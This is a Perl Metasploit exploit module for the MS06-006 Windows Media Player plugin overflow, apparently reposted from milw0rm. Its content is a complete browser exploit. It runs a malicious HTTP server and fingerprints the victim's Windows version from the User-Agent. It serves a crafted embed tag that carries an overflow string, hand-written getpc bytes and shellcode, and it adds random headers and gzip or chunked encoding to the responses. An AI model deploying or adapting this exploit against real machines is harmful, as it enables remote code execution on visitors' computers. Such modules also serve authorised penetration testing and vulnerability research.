##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wmp_plugin_ms06_006;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use IPC::Open3;

 my $advanced =
  {
	'Gzip'       => [1, 'Enable gzip content encoding'],
	'Chunked'    => [1, 'Enable chunked transfer encoding'],
  };

my $info =
  {
	'Name'           => 'Windows Media Player Plugin MS06-006 Overflow',
	'Version'        => '$Revision: 1.1 $',
	'Authors'        =>
	  [
		'H D Moore <hdm [at] metasploit.com',
	  ],

	'Description'    =>
	  Pex::Text::Freeform(qq{
		This module exploits a vulnerability in the Windows Media Player plugin
		for non-Microsoft web browsers. This module has been tested with Windows
		Media Player 9 on Windows 2000 SP4, Windows XP SP2, and Windows 2003 SP0
		(Firefox 1.5 and Opera 8.5).
}),

	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32', 'winxp', 'win2003' ],
	'Priv'           => 0,

	'AutoOpts'       => { 'EXITFUNC' => 'process', 'GETPCTYPE' => 'ecx' },
	'UserOpts'       =>
	  {
		'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
		'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0" ],
	  	'REALHOST' => [ 0, 'HOST', 'External address to use for redirects (NAT)' ],
	  },

	'Payload'        =>
	  {
		# give some stack space, align esp
		'Space'     => 1024,
		'BadChars'  => "\x00\x22".join('', map { $_=chr($_) } (0x80 .. 0xff)),
		'MinNops'   => 0,
		'MaxNops'   => 0,
	  },
	'Refs'           =>
	  [
	  	['CVE', '2006-0005'],
	  	['OSVDB', '23132'],
		['MSB', 'MS06-006'],
		['BID', '15130'],
	  ],

	'DefaultTarget'  => 0,
	'Targets'        =>
	  [
		[ 'Automatic - WMP 9.0', 0x07694b1e ]
	  ],

	'Keys'           => [ 'wmp' ],

	'DisclosureDate' => 'Feb 14 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('HTTPHOST'),
		LocalPort => $self->GetVar('HTTPPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp'
	  );
	my $client;

	# Did the listener create fail?
	if (not defined($server)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar('HTTPPORT'));
		return;
	}

	my $httphost = $self->GetVar('HTTPHOST');
	$httphost = Pex::Utils::SourceIP('1.2.3.4') if $httphost eq '0.0.0.0';

	$self->PrintLine("[*] Waiting for connections to http://". $httphost .":". $self->GetVar('HTTPPORT') ."/");

	while (defined($client = $server->accept())) {
		$self->HandleHttpClient(Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my $fd   = shift;

	# Set the remote host information
	my ($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);
		

	# Read the HTTP command
	my ($cmd, $url, $proto) = split(/ /, $fd->RecvLine(10), 3);
	my $agent;
	
	# Read in the HTTP headers
	while ((my $line = $fd->RecvLine(10))) {
		
		$line =~ s/^\s+|\s+$//g;
		
		my ($var, $val) = split(/\:/, $line, 2);

		# Break out if we reach the end of the headers
		last if (not defined($var) or not defined($val));

		$agent = $val if $var =~ /User-Agent/i;
	}


	my $addr;

	##
	# XXX Does not detect Windows SP levels or WMP version :-(
	##

	# Windows NT and Windows 2000 systems
	if ($agent =~ /Windows NT [45]\.0/) {
		$self->PrintLine("[*] Targetting WMP v9 on NT/2000...");
		$addr = 0x07694b1e; # wmp.dll v9.00.00.2980
	}

	# Windows XP SP2
	if ($agent =~ /Windows NT 5\.1/) {
		$self->PrintLine("[*] Targetting WMP v9 on XP SP2...");	
		$addr = 0x4b5d5c74; # wmp.dll v9.00.00.3250
	}
	
	# Windows 2003 SP0
	if ($agent =~ /Windows NT 5\.2/) {
		$self->PrintLine("[*] Targetting WMP v9 on 2003 SP0...");	
		$addr = 0x585a6052; # wmp.dll v9.00.00.2991
	}	
	

	my $target    = $self->Targets->[$self->GetVar('TARGET')];
	my $shellcode = $self->GetVar('EncodedPayload')->Payload;
	my $pattern   = "C" x 4000;

	$addr = $target->[1] if ! $addr;
	
	# We can't use SEH getpc from inside a SEH handler on XP SP2 >:(
	# So we do it like a drunk ninja.
	my $getpc = 
		"\x58\x58\x58".         # pop eax, pop eax, pop eax
		"\x05\x18\x29\x29\x29". # add eax,0x29292917
		"\x2d\x01\x29\x29\x29". # sub eax,0x29292901
		"\x50\x59";             # push eax, pop ecx

	substr($pattern, 2082, 4, "ABC=");       # inc, inc, inc, cmp eax, [ptr]	
	substr($pattern, 2086, 4, pack('V', $addr));
	substr($pattern, 2090, length($getpc), $getpc);
	substr($pattern, 2090 + length($getpc), length($shellcode), $shellcode);

	my $content   = "<html><body><embed type=\"application/x-mplayer2\" src=\"$pattern.wmv\"></body></html>";

	$self->PrintLine("[*] HTTP Client connected from $rhost:$rport, sending ".length($shellcode)." bytes of payload...");

	$fd->Send($self->BuildResponse($content));

	# Prevents IE from throwing an error in some cases
	select(undef, undef, undef, 0.1);

	$fd->Close();
}

sub RandomHeaders {
	my $self = shift;
	my $head = '';

	while (length($head) < 3072) {
		$head .= "X-" .
		  Pex::Text::AlphaNumText(int(rand(30) + 5)) . ': ' .
		  Pex::Text::AlphaNumText(int(rand(256) + 5))  ."\r\n";
	}
	return $head;
}


sub BuildResponse {
	my ($self, $content) = @_;

	my $response =
	  "HTTP/1.1 200 OK\r\n" .
	  $self->RandomHeaders() .
	  "Content-Type: text/html\r\n";

	if ($self->GetVar('Gzip')) {
		$response .= "Content-Encoding: gzip\r\n";
		$content = $self->Gzip($content);
	}
	if ($self->GetVar('Chunked')) {
		$response .= "Transfer-Encoding: chunked\r\n";
		$content = $self->Chunk($content);
	} else {
		$response .= 'Content-Length: ' . length($content) . "\r\n" .
		  "Connection: close\r\n";
	}

	$response .= "\r\n" . $content;

	return $response;
}

sub Chunk {
	my ($self, $content) = @_;

	my $chunked;
	while (length($content)) {
		my $chunk = substr($content, 0, int(rand(10) + 1), '');
		$chunked .= sprintf('%x', length($chunk)) . "\r\n$chunk\r\n";
	}
	$chunked .= "0\r\n\r\n";

	return $chunked;
}

sub Gzip {
	my $self = shift;
	my $data = shift;
	my $comp = int(rand(5))+5;

	my($wtr, $rdr, $err);

	my $pid = open3($wtr, $rdr, $err, 'gzip', '-'.$comp, '-c', '--force');
	print $wtr $data;
	close ($wtr);
	local $/;

	return (<$rdr>);
}

1;

# milw0rm.com [2006-02-17]
